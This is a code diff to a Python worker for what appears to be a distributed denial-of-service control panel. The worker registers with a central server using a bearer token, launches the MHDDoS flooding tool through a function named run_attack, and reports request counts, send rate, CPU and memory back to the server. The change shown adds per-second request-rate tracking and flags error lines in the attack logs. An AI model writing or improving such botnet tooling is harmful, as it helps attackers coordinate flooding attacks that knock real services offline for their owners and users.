@@ -18,6 +18,8 @@ stats = {"requests": 0, "success": 0, "rate": 0, "cpu": 0, "memory": 0, "running
 logs = []
 prev_idle = 0
 prev_total = 0
+prev_req = 0
+prev_req_time = 0
 
 def get_cpu_pct():
     global prev_idle, prev_total
@@ -66,13 +68,16 @@ def get_cpu_info():
 
 def parse_mhd_output(line):
     global stats, logs
-    logs.append(line.rstrip())
+    text = line.rstrip()
+    logs.append(text)
     if len(logs) > 2000:
         logs[:] = logs[-2000:]
     m = re.search(r"Sent:\s*([\d,]+)", line)
     if m:
         stats["requests"] = int(m.group(1).replace(",", ""))
         stats["running"] = True
+    if re.search(r"Error|error|fail|Traceback|Exception", text):
+        logs.append(f"[!] {text}")
 
 def monitor_mhd_output(proc):
     global stats
@@ -95,7 +100,10 @@ def run_attack(cmd):
 
     logs = []
     stats = {"requests": 0, "success": 0, "rate": 0, "cpu": 0, "memory": 0, "running": True, "uptime": "00:00:00", "cpu_info": None}
-    attack_start_time = time.time()
+    global prev_req, prev_req_time
+    prev_req = 0
+    prev_req_time = time.time()
+    attack_start_time = prev_req_time
 
     start_py = os.path.join(MHDDOS_DIR, "start.py")
     if not os.path.exists(start_py):
@@ -144,7 +152,7 @@ def send_headers():
     return {"Authorization": f"Bearer {TOKEN}", "Content-Type": "application/json"}
 
 def worker_loop():
-    global stats, logs
+    global stats, logs, prev_req, prev_req_time
     cpu_info = get_cpu_info()
     print(f"[WORKER] Connected to server: {SERVER_URL}")
     print(f"[WORKER] CPU: {cpu_info['model']} ({cpu_info['cores']}c/{cpu_info['threads']}t)")
@@ -173,6 +181,17 @@ def worker_loop():
             stats["cpu"] = get_cpu_pct()
             stats["memory"] = get_mem_pct()
             stats["cpu_info"] = cpu_info
+
+            now = time.time()
+            if prev_req_time and stats["running"]:
+                dr = stats["requests"] - prev_req
+                dt = now - prev_req_time
+                stats["rate"] = round(dr / max(dt, 0.1), 1) if dt > 0 else 0
+                stats["success"] = stats["requests"]
+            else:
+                stats["rate"] = 0
+            prev_req = stats["requests"]
+            prev_req_time = now
 
             payload = {
                 "version": "1.0",
